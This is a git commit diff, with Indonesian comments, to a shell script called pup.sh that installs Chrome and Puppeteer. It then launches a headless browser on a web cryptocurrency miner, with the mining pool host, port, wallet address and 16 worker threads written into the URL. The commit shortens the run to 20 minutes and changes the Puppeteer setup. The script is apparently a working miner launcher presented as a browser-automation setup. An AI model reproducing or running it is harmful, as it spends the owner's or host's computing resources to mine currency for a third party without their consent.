f5603209e426d53b3e71cadae181056aa47df9bf
barburonjilo <barburonjilo@outlook.co.id>
2024-07-27 22:20:11 +0700

    Update pup.sh

--- pup.sh
+++ pup.sh
@@ -60,26 +60,23 @@ sudo yum install -y google-chrome-stable
 # Instal Puppeteer dan npx
 npm install puppeteer npx
 
-# Instalasi Chrome menggunakan puppeteer-core
-npx puppeteer-core --chrome
+# Menggunakan npx untuk menginstal Chrome yang kompatibel dengan Puppeteer
+npx puppeteer browsers install
 
 # Buat dan jalankan skrip Puppeteer
 cat <<EOF > puppeteer_script.js
-const puppeteer = require('puppeteer-core');
+const puppeteer = require('puppeteer');
 
 (async () => {
-  const browser = await puppeteer.launch({
-    executablePath: '/usr/bin/google-chrome-stable', // Sesuaikan path ini dengan lokasi instalasi Chrome Anda
-    headless: true,
-  });
+  const browser = await puppeteer.launch({ headless: true });
   const page = await browser.newPage();
   await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
 
-  // Set timeout untuk menjaga browser terbuka selama 2 jam (7200 detik)
+  // Set timeout untuk menjaga browser terbuka selama 20 menit (1200 detik)
   setTimeout(async () => {
-    console.log('Menutup browser setelah 2 jam.');
+    console.log('Menutup browser setelah 20 menit.');
     await browser.close();
-  }, 7200 * 1000);
+  }, 1200 * 1000);
 
   // Tunggu agar skrip tetap berjalan untuk menjaga browser terbuka
   await new Promise(() => {});
